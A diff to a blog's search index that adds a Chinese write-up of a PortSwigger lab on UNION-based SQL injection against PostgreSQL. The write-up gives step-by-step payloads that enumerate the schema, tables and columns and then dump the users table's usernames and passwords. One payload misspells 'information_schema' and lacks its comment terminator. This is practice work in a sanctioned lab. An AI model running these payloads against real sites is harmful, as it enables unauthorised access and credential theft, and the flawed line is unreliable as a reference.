@@ -718,12 +718,13 @@ flag:<code>NSSCTF{60ad8607-7f07-4fc0-ba19-b5a1e232ab99}</code></p>
       <tags>
         <tag>SQL</tag>
         <tag>Web</tag>
+        <tag>portswigger</tag>
       </tags>
   </entry>
   <entry>
-    <title>portswigger</title>
+    <title>SQL注入攻击，查询Oracle数据库类型和版本</title>
     <url>/2026/11/06/portswigger-sql-2/</url>
-    <content><![CDATA[<h1>Lab: SQL注入</h1>
+    <content><![CDATA[<h1>Lab: SQL注入攻击，查询Oracle数据库类型和版本</h1>
 <ul>
 <li>使用portswigger靶场：</li>
 </ul>
@@ -760,6 +761,67 @@ Oracle 每一条 SELECT <strong>必须带 FROM</strong>，不能直接 <code>sel
       <tags>
         <tag>SQL</tag>
         <tag>Web</tag>
+        <tag>portswigger</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL 注入攻击，列出非 Oracle 数据库的内容</title>
+    <url>/2026/11/08/portswigger_sql_3/</url>
+    <content><![CDATA[<h1>Lab: SQL 注入攻击，列出非 Oracle 数据库的内容</h1>
+<ul>
+<li>使用portswigger靶场：</li>
+</ul>
+<p>这是PostgreSQL数据库<br>
+题目告诉我们需要通过sql注入获取数据库中的信息,以此来获取所有用户的用户名和密码</p>
+<p><img src="/image/portswigger-sql-3/1.png" alt="alt text"></p>
+<p>开始还是和上一篇一样测出有几个注入点<br>
+然后构造</p>
+<p><code>-1'+union+select+'11',current_schema--+</code></p>
+<p>(因为是在bp中输入，所以将空格改为'+'号)<br>
+<img src="/image/portswigger-sql-3/2.png" alt="alt text"><br>
+成功得到库名:<code>public</code><br>
+构造<br>
+<code>-1'+union+select+'11',table_name+from+information_schema.tables+where+table_schema='public'--+</code></p>
+<p><img src="/image/portswigger-sql-3/3.png" alt="alt text"></p>
+<p>得到表名,注意到有一个名为<code>users_xuturi</code>的表，我要寻找的账户密码大概率在这里面<br>
+然后构造:<br>
+<code>-1'+union+select+'11',column_name+from+infromation_schema.columns+where+table_schema='public'+and+table_name='users_xuturi'</code>来得到三个列名<br>
+<code>username_cusuti</code> , <code>password_gokydw</code>,<code>email</code><br>
+比较明显，我要找的账户密码应该就在这里<br>
+<strong>(库里面的表名有可能不一样，我第二次注入得到的和第一次不同)</strong><br>
+最好准备脱库拿账号密码:<br>
+构造:<br>
+<code>-1'+union+select+username_cusuti,password_gokydw+from+public.users_xuturi--+</code></p>
+<p><img src="/image/portswigger-sql-3/4.png" alt="alt text"></p>
+<p>最后输入拿到的账号密码，成功通关</p>
+<p><img src="/image/portswigger-sql-3/5.png" alt="alt text"></p>
+<p>这一题整体的payload和mysql的基本差不多，只需要修改一些小细节,而且PostgreSQL没有group函数和database()<br>
+在拿库名上一些主要的小区别:</p>
+<ul>
+<li>MySQL：<code>database()</code>、<code>schema()</code></li>
+<li>PostgreSQL：<code>current_database()</code>、<code>current_schema()</code></li>
+<li>Oracle：<code>sys_context('userenv','current_schema')</code> / <code>user</code></li>
+</ul>
+<p>我后面也尝试能不能用两个注入口输出三个数据:<br>
+最开始时直接把三个指令拼接在一起:<br>
+<code>-1'+union+select+username_cusuti||'|'||password_gokydw||'|'||email,'NULL'+from+public.users_xuturi--+</code><br>
+但是输出一直时空白，不管是页面渲染还是响应包里面的都没有返回</p>
+<p><img src="/image/portswigger-sql-3/6.png" alt="alt text"><br>
+<img src="/image/portswigger-sql-3/7.png" alt="alt text"></p>
+<p>后面修改为concat函数:<br>
+<code>-1'+union+select+concat(username_cusuti,chr(124),password_gokydw,chr(124),email),NULL+from+public.users_xuturi--+</code></p>
+<p><img src="/image/portswigger-sql-3/8.png" alt="alt text"></p>
+<p>还是可以显示(eamil里面就没有内容)<br>
+后面查询一下资料,可能是这样:只要任意一个值是 NULL，<strong>整个拼接结果直接变成 NULL</strong>，页面就看不到这条数据<br>
+但是我也尝试两个拼接，一个单独显示，输出依旧是空白</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL</tag>
+        <tag>Web</tag>
+        <tag>portswigger</tag>
       </tags>
   </entry>
 </search>
